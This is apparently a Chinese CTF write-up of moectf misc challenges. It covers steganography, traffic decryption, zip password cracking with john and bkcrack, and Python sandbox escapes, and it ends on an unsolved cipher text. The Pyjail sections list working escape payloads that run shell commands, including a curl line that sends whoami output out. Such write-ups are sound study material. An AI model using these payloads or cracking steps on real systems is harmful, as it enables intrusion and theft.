<hr>
<h2 id="title-moectf-wpdate-2025-09-09-22-46-37tags"><a href="#title-moectf-wpdate-2025-09-09-22-46-37tags" class="headerlink" title="title: moectf-wpdate: 2025-09-09 22:46:37tags:"></a>title: moectf-wp<br>date: 2025-09-09 22:46:37<br>tags:</h2><h1 id="moectf"><a href="#moectf" class="headerlink" title="moectf"></a>moectf</h1><h2 id="1-misc"><a href="#1-misc" class="headerlink" title="1.misc"></a>1.misc</h2><h3 id="1-Misc入门指北"><a href="#1-Misc入门指北" class="headerlink" title="1.Misc入门指北"></a>1.<strong>Misc入门指北</strong></h3><p>下载附件直接搜moe,把那一串复制即可</p>
<p><img src="/./image-20250809112218538.png" alt="./image-20250809112218538"></p>
<pre><code>moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}
</code></pre>
<h3 id="2-ez-LSB"><a href="#2-ez-LSB" class="headerlink" title="2.ez_LSB"></a>2.<strong>ez_LSB</strong></h3><p>zsteg一把梭</p>
<p><img src="/./image-20250809113628584.png" alt="./image-20250809113628584"></p>
<pre><code>The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9&quot;
moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}
</code></pre>
<h3 id="3-sstv"><a href="#3-sstv" class="headerlink" title="3.sstv"></a>3.sstv</h3><p>找一个能解码sstv的即可</p>
<p><img src="/././image-20250809120047593.png" alt="./image-20250809120047593"></p>
<pre><code>moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}
</code></pre>
<h3 id="4-捂住一只耳"><a href="#4-捂住一只耳" class="headerlink" title="4.捂住一只耳"></a>4.<strong>捂住一只耳</strong></h3><p>用audacity打开</p>
<p><img src="/././image-20250809151755692.png" alt="./image-20250809151755692"></p>
<pre><code>.._. ._.. ._ __.  .. ... ___... .... ._  ._.. .._. ..__._  ._. ._ _.. .. ___ ..__._ ..  _. ..__._ _.._  _..  .._
</code></pre>
<pre><code>..-. .-.. .- --. .. ... ---... .... .- .-.. ..-. ..--.- .-. .- -.. .. --- ..--.- .. .- ..--.- -..- -.. ..-
</code></pre>
<p>解码得到</p>
<pre><code>FLAGIS:HALF_RADIO_IN_XDU
moectf{HALF_RADIO_IN_XDU}
</code></pre>
<h3 id="5-Enchantment"><a href="#5-Enchantment" class="headerlink" title="5.Enchantment"></a>5.<strong>Enchantment</strong></h3><p>wireshark打开,先用http.request.method &#x3D;&#x3D; “POST”查看上传文件,选中Portable Network Graphics导出分组字节流</p>
<p><img src="/1.png" alt="1"></p>
<p>银河字母解密即可</p>
<p><img src="/OIP.webp" alt="a"></p>
<pre><code>theflagisbelow nowyouhave mastered enchanting
moectf{now_you_have_mastered_enchanting}
</code></pre>
<h3 id="6-ez-png"><a href="#6-ez-png" class="headerlink" title="6.ez_png"></a>6.<strong>ez_png</strong></h3><p>用binwalk过一遍,就出来了</p>
<p><img src="/./image-20250810182019080.png" alt="./image-20250810182019080"></p>
<pre><code>moectf{h1DdEn_P4YlOaD_IN-Id4T}
</code></pre>
<h3 id="7-ez-锟斤拷"><a href="#7-ez-锟斤拷" class="headerlink" title="7.ez_锟斤拷????"></a>7.<strong>ez_锟斤拷????</strong></h3><p>gbk转utf8即可</p>
<pre><code>moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}
</code></pre>
<h3 id="8-ez-ssl"><a href="#8-ez-ssl" class="headerlink" title="8.ez_ssl"></a>8.<strong>ez_ssl</strong></h3><p>导出http对象,发现上传了ssl.log</p>
<pre><code>------WebKitFormBoundary1EV4LSnnRBL8OzyB
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ssl.log&quot;
Content-Type: application/octet-stream

CLIENT_RANDOM 5cc9d58e7bf7268c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4
CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4

------WebKitFormBoundary1EV4LSnnRBL8OzyB--
</code></pre>
<p>有了这个ssl.log,我们就可以解密https流量</p>
<ol>
<li><p>打开 Wireshark → <strong>Edit → Preferences → Protocols → TLS</strong></p>
</li>
<li><p>在 <strong>(Pre)-Master-Secret log filename</strong> 填入 <code>ssl.log</code> 文件路径</p>
</li>
<li><p>Wireshark 就能自动用里面的密钥解密 TLS 流量，显示 HTTP&#x2F;HTTPS 明文</p>
</li>
</ol>
<p>浏览流量包,发现存在上传流量</p>
<p><img src="/./image-20250817145859586.png" alt="./image-20250817145859586"></p>
<p><img src="/./image-20250817145939375.png" alt="./image-20250817145939375"></p>
<p>可见上传了flag.zip,密码为纯7位数字,导出解压</p>
<pre><code>zip2john 1.zip &gt; hash.txt
john --format=zip --mask=?d?d?d?d?d?d?d hash.txt
</code></pre>
<p><img src="/./image-20250817151553263.png" alt="./image-20250817151553263"></p>
<p>6921682</p>
<p>ook解密即可</p>
<p><img src="/./image-20250817151850739.png" alt="./image-20250817151850739"></p>
<pre><code>moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}
</code></pre>
<h3 id="9-encrypted-pdf"><a href="#9-encrypted-pdf" class="headerlink" title="9.encrypted_pdf"></a>9.<strong>encrypted_pdf</strong></h3><p>下载得到加密的pdf,放在ilovepdf里解密<img src="/./image-20250818155612936.png" alt="./image-20250818155612936"></p>
<p>矢量化pdf,<a href="https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870">https://tools.pdf24.org/zh/pdf-to-svg#s=1755503577870</a></p>
<p><img src="/./image-20250818155634286.png" alt="./image-20250818155634286"></p>
<pre><code>moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}
</code></pre>
<h3 id="10-万里挑一"><a href="#10-万里挑一" class="headerlink" title="10.万里挑一"></a>10.<strong>万里挑一</strong></h3><p>一万个压缩包里找到一个正确的密码,解压lock.zip</p>
<pre><code class="python">import pyzipper
import zipfile
import os
import re

# 路径配置
lock_zip = r&quot;D:\Problems\moe\1\lock.zip&quot;
password_zip = r&quot;D:\Problems\moe\1\password.zip&quot;
extract_root = r&quot;D:\Problems\moe\1\extracted&quot;
lock_extract_dir = r&quot;D:\Problems\moe\1\unlocked&quot;

# 正则匹配 &quot;The password is:&quot; 后面的内容
password_pattern = r&#39;The password is:\s*(\S+)&#39;

# 尝试用密码解锁 lock.zip 中的 flag.zip（支持 AES 加密）
def try_unlock_flag_zip(password):
    try:
        with pyzipper.AESZipFile(lock_zip) as zf:
            for name in zf.namelist():
                if name.lower().endswith(&#39;flag.zip&#39;):
                    print(f&quot;尝试解锁 {name}，使用密码 {password}&quot;)
                    zf.extract(name, path=lock_extract_dir, pwd=password.encode())
                    print(f&quot;成功解压 {name}！密码: {password}&quot;)
                    return True
    except Exception as e:
        print(f&quot;密码 {password} 解锁失败: {e}&quot;)
    return False

# 递归提取 password.zip 中 pwd.txt 并尝试解锁 flag.zip
def recursive_extract_password(zip_path, extract_to):
    try:
        with zipfile.ZipFile(zip_path) as zf:
            for name in zf.namelist():
                file_path = os.path.join(extract_to, name)

                # 如果是 pwd.txt
                if name.lower().endswith(&#39;pwd.txt&#39;):
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)
                    zf.extract(name, extract_to)
                    with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;, errors=&#39;ignore&#39;) as f:
                        content = f.read()
                        match = re.search(password_pattern, content)
                        if match:
                            password = match.group(1)
                            print(f&quot;找到密码: {password}&quot;)
                            if try_unlock_flag_zip(password):
                                return True

                # 如果是 zip 文件，递归处理
                elif name.lower().endswith(&#39;.zip&#39;):
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)
                    zf.extract(name, extract_to)
                    if recursive_extract_password(file_path, os.path.join(extract_to, os.path.splitext(name)[0])):
                        return True
    except Exception as e:
        print(f&quot;处理 {zip_path} 出错: {e}&quot;)
    return False

# 创建必要目录
os.makedirs(extract_root, exist_ok=True)
os.makedirs(lock_extract_dir, exist_ok=True)

# 开始递归提取密码并尝试解锁 flag.zip
success = recursive_extract_password(password_zip, extract_root)
if not success:
    print(&quot;未找到有效密码，flag.zip 未解锁。&quot;)
</code></pre>
<p><img src="/./image-20250818162540911.png" alt="./image-20250818162540911"></p>
<p>密码为a296a5ec1385f394e8cb</p>
<p><img src="/./image-20250818163543529.png" alt="./image-20250818163543529"></p>
<p>已知明文.exe和flag.txt加密类型为都为ZipCrypto Store,尝试明文攻击,先攻击明文.exe</p>
<p>首先准备明文文件</p>
<pre><code class="bash">echo -n &quot;0E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000&quot; | xxd -r -ps &gt; mingwen
</code></pre>
<p>进行攻击</p>
<pre><code class="bash">bkcrack -C flag.zip -c 明文.exe -p mingwen -o 102 &gt; 1.log
</code></pre>
<p><img src="/./image-20250818210745588.png" alt="./image-20250818210745588"></p>
<p>得到keys</p>
<pre><code>Keys: eec878a3 6808e48f 3aa41bd8
</code></pre>
<p>攻击flag.txt</p>
<pre><code class="bash">bkcrack -C flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d decrypted_flag.txt
</code></pre>
<p><img src="/./image-20250818211034187.png" alt="./image-20250818211034187"></p>
<pre><code>moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}
</code></pre>
<h3 id="11-rush"><a href="#11-rush" class="headerlink" title="11.rush"></a>11.rush</h3><p>补全定位符即可</p>
<p><img src="/repaired_fbe8722b511145ecad90cadde51fda34.png" alt="修复后图像"></p>
<p><img src="/26892102415759ae63b08714fdd2249a.jpg" alt="26892102415759ae63b08714fdd2249a"></p>
<pre><code>moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}
</code></pre>
<h3 id="12-weird-photo"><a href="#12-weird-photo" class="headerlink" title="12.weird_photo"></a>12.<strong>weird_photo</strong></h3><p>改宽即可</p>
<p><img src="/./image-20250823114215490.png" alt="./image-20250823114215490"></p>
<pre><code>moectf{./image_Height_Restored}
</code></pre>
<h3 id="13-WebRepo"><a href="#13-WebRepo" class="headerlink" title="13.WebRepo"></a>13.<strong>WebRepo</strong></h3><p>扫码,得到提示</p>
<p><img src="/46580d66ba2a82ff87f299d4bc4ddba0_720.png" alt="46580d66ba2a82ff87f299d4bc4ddba0_720"></p>
<p>用binwalk检测出</p>
<pre><code class="bash">└─# binwalk --run-as=root 1.zip                                              

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16012         0x3E8C          7-zip archive data, version 0.3
</code></pre>
<p>用以下命令提取</p>
<pre><code class="bash">dd if=1.zip of=repo.7z bs=1 skip=16012
</code></pre>
<p><img src="/./image-20250823140730622.png" alt="./image-20250823140730622"></p>
<p>发现有flag.txt,且这个文件夹其实就是.git文件,直接从提交里导出flag.txt</p>
<pre><code class="bash">git log --pretty=oneline -- flag.txt //249ff41401736165cd4514cee7afcd31ecfe7d09
git show &lt;提交哈希&gt;:flag.txt &gt; flag.txt
</code></pre>
<p><img src="/./image-20250823140946052.png" alt="./image-20250823140946052"></p>
<pre><code>moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}
</code></pre>
<h3 id="14-Encrypted-volume"><a href="#14-Encrypted-volume" class="headerlink" title="14.Encrypted volume"></a>14.<strong>Encrypted volume</strong></h3><p>从题目和提示猜测和veracrypt有关.将附件用binwalk分离出一张二维码</p>
<p><img src="/hidden.png" alt="hidden"></p>
<pre><code>:@(s&lt;&quot;A3F:89x541Ux[&lt;
</code></pre>
<p>然后有一个volume文件,我们用上面的工具挂载下来</p>
<p><img src="/./image-20250824011337699.png" alt="./image-20250824011337699"></p>
<p>得到brainfuck.txt，解密即可</p>
<p><img src="/./image-20250824011458606.png" alt="./image-20250824011458606"></p>
<pre><code>moectf{nOW_YoU-h4V3_UNlocKED-VOlumE}
</code></pre>
<h3 id="15-pyjail0"><a href="#15-pyjail0" class="headerlink" title="15.pyjail0"></a>15.pyjail0</h3><pre><code>nc 192.168.243.1 54227
</code></pre>
<p>然后按照要求即可,flag在&#x2F;proc&#x2F;self&#x2F;environ</p>
<p><img src="/./image-20250907151003455.png" alt="./image-20250907151003455"></p>
<pre><code>moectf{a8b61373-b10d-c71a-b109-041b45320746}
</code></pre>
<h3 id="16-Pyjail-1"><a href="#16-Pyjail-1" class="headerlink" title="16.Pyjail 1"></a>16.<strong>Pyjail 1</strong></h3><pre><code class="python">def chall():
    user_input = input(&quot;Give me your code: &quot;)

    # 过滤关键字
    forbidden_keywords = [&#39;import&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;open&#39;, &#39;file&#39;]
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f&quot;Forbidden keyword detected: {keyword}&quot;)
            return
    
    result = eval(user_input)
</code></pre>
<p>需要进行沙箱逃逸参考文档:<a href="https://www.cnblogs.com/N1ng/p/18491520">https://www.cnblogs.com/N1ng/p/18491520</a></p>
<p>尝试用help()无法绕过</p>
<p>黑名单可以用unicode编码绕过,网上找的脚本如下</p>
<pre><code class="python">from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict

lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize(&quot;NFKC&quot;, chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) &gt; 9:
            break
print(dic)
</code></pre>
<p>得到</p>
<pre><code>𝓮val(inp𝓾t())
</code></pre>
<p>输入之后进入交互状态,之后即可逃逸</p>
<pre><code>__import__(&#39;os&#39;).system(&#39;cat /tmp/f*&#39;)
</code></pre>
<p><img src="/./image-20250907201208507.png"></p>
<pre><code>moectf{1abe3a6d-4e4e-2cf4-7b0a-4ccfd7cb8a6b}
</code></pre>
<pre><code>𝓮val(inp𝓾t())

__import__(&#39;os&#39;).system(&#39;cat /tmp/f*&#39;)
</code></pre>
<h3 id="17-Pyjail-2"><a href="#17-Pyjail-2" class="headerlink" title="17.Pyjail 2"></a>17.Pyjail 2</h3><pre><code class="python">def chall():
    user_input = input(&quot;Give me your code: &quot;)

    # 过滤关键字
    forbidden_keywords = [&#39;import&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;open&#39;, &#39;file&#39;]
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f&quot;Forbidden keyword detected: {keyword}&quot;)
            return
    
    # 过滤特殊字符
    forbidden_chars = [&#39;.&#39;, &#39;_&#39;, &#39;[&#39;, &#39;]&#39;, &quot;&#39;&quot;, &#39;&quot;&#39;]
    for char in forbidden_chars:
        if char in user_input:
            print(f&quot;Forbidden character detected: {char}&quot;)
            return

    result = eval(user_input)
</code></pre>
<p>本地测试发现上一题的payload可以继续打</p>
<p><img src="/./image-20250907201821971.png" alt="./image-20250907201821971"></p>
<pre><code>moectf{74642fb3-4cea-91a2-ffb3-50f2c35302b6}
</code></pre>
<h3 id="17-pyjail-3"><a href="#17-pyjail-3" class="headerlink" title="17.pyjail 3"></a>17.pyjail 3</h3><pre><code class="python">def chall():
    user_input = input(&quot;Give me your code: &quot;)
        
    try:
        result = eval(user_input, {&quot;__builtins__&quot;: None}, {})
        # Hint: When __builtins__ is None, you need to be more creative...
        print(&quot;Code executed successfully!&quot;)
        if result is not None:
            print(f&quot;Return value: {result}&quot;)
    except Exception as e:
        print(f&quot;Execution error: {type(e).__name__}: {e}&quot;)
        
</code></pre>
<p>这里直接清空了所有builtins里的函数</p>
<pre><code># os
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;cat /tmp/f*&quot;)

# subprocess 
[ x for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__ == &#39;Popen&#39;][0](&#39;ls&#39;)

# builtins
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#39;help&#39;]

[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#39;__builtins__&#39;]

#sys
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;&#39;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;&#39;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;&#39;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#39;ctypes&#39;).CDLL(None).system(&#39;ls /&#39;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#39;multiprocessing&#39;).Process(target=lambda: __import__(&#39;os&#39;).system(&#39;curl localhost:9999/?a=`whoami`&#39;)).start()
</code></pre>
<p>这是我从<a href="https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8F%E6%89%BE%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E9%93%BE%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E9%80%83%E9%80%B8%E7%9A%84payload,%E4%BB%A5%E7%AC%AC%E4%B8%80%E6%9D%A1%E4%B8%BA%E4%BE%8B%E8%A7%A3%E9%87%8A">https://blog.lightwing.top/2025/01/12/python_jail_escape/#%E4%B8%8A%E8%BF%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E6%96%B9%E5%BC%8F找到的一些通过继承链的方式进行逃逸的payload,以第一条为例解释</a></p>
<p>分步拆解:</p>
<ol>
<li><strong><code>&#39;&#39;.__class__</code></strong><ul>
<li>空字符串 <code>&#39;&#39;</code> 的类就是 <code>str</code>。</li>
<li>所以 <code>&#39;&#39;.__class__ == str</code>。</li>
</ul>
</li>
<li><strong><code>.__base__</code></strong><ul>
<li><code>str</code> 继承自 <code>object</code>。</li>
<li>所以 <code>&#39;&#39;.__class__.__base__ == object</code>。</li>
</ul>
</li>
<li><strong><code>.__subclasses__()</code></strong><ul>
<li><code>object.__subclasses__()</code> 会返回当前所有 <strong><code>object</code> 的子类</strong>，也就是 Python 运行环境中加载的所有类对象。</li>
<li>这包含了很多标准库的类，比如 <code>type</code>, <code>tuple</code>, <code>list</code>, <code>_wrap_close</code> 等。</li>
</ul>
</li>
<li><strong><code>if x.__name__==&quot;_wrap_close&quot;</code></strong><ul>
<li>遍历 <code>object.__subclasses__()</code> 返回的所有类，筛选出名字叫 <code>&quot;_wrap_close&quot;</code> 的类。</li>
<li><code>_wrap_close</code> 是 Python 在处理 I&#x2F;O 时用的一个内部类。</li>
</ul>
</li>
<li><strong><code>x.__init__.__globals__</code></strong><ul>
<li>取 <code>_wrap_close</code> 类的 <code>__init__</code> 方法。</li>
<li>每个函数对象都有一个 <code>__globals__</code> 属性，指向定义它时所在的全局变量字典（也就是一整个 Python 全局命名空间）。</li>
<li>在这个字典里，可以找到内置函数、模块等，包括 <code>system</code>。</li>
</ul>
</li>
<li><strong><code>[ ... ][0]</code></strong><ul>
<li>前面用列表推导式找到了目标类，把它们的 <code>__globals__</code> 收集到列表中。</li>
<li>取第一个 <code>[0]</code>。</li>
</ul>
</li>
<li><strong><code>[&quot;system&quot;]</code></strong><ul>
<li>从全局字典里拿到键 <code>&quot;system&quot;</code> 对应的值，也就是 <code>os.system</code>。</li>
</ul>
</li>
<li><strong><code>(&quot;cat /tmp/f\*&quot;)</code></strong><ul>
<li>调用 <code>os.system(&quot;cat /tmp/f*&quot;)</code>，执行系统命令，把 <code>/tmp</code> 目录下以 <code>f</code> 开头的文件打印出来。</li>
</ul>
</li>
</ol>
<p><img src="/./image-20250907210356136.png"></p>
<pre><code>moectf{4ef3e96b-f34a-0bc3-5174-8e702603a155}
</code></pre>
<h3 id="18-哈基米语"><a href="#18-哈基米语" class="headerlink" title="18.哈基米语"></a>18.哈基米语</h3><pre><code>南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没撸多？阿西噶压咕吉豆没咕欧莫季里。奈诺娜美嘎吉豆没咕吉豆哈基米？欧莫季里没咕奶压多那吉库路曼波；阿西噶压豆没咕奶椰奶龙；奈诺娜美嘎压多那吉南北绿豆，窝那没撸多豆没咕吉欧莫季里；南北绿豆豆没咕吉豆奈诺娜美嘎。库路曼波没咕吉豆奈诺娜美嘎，南北绿豆没咕吉豆没咕吉窝那没撸多？库路曼波豆耶咕奶压多阿西噶压，哈基米那吉豆没米吉豆窝那没撸多；哈基米没咕吉豆没咕吉南北绿豆？奈诺娜美嘎豆没咕吉豆没奈诺娜美嘎；南北绿豆咕吉豆没南北绿豆。奈诺娜美嘎咕奶压多那吉奈诺娜美嘎？南北绿豆豆没米吉椰奶龙；椰奶龙豆没咕吉豆没窝那没撸多？欧莫季里咕吉豆没咕吉豆库路曼波；欧莫季里没咕吉豆没咕南北绿豆？奈诺娜美嘎吉豆没咕奶窝那没撸多；南北绿豆压多那吉豆没咕哈基米？欧莫季里吉豆没米吉豆欧莫季里；阿西噶压没咕吉豆奈诺娜美嘎；阿西噶压没咕吉豆没咕吉椰奶龙，哈基米豆没咕吉豆没阿西噶压？南北绿豆咕奶压多那椰奶龙。欧莫季里吉豆没咕吉豆没库路曼波；哈基米吗喵子路路吉阿西噶压，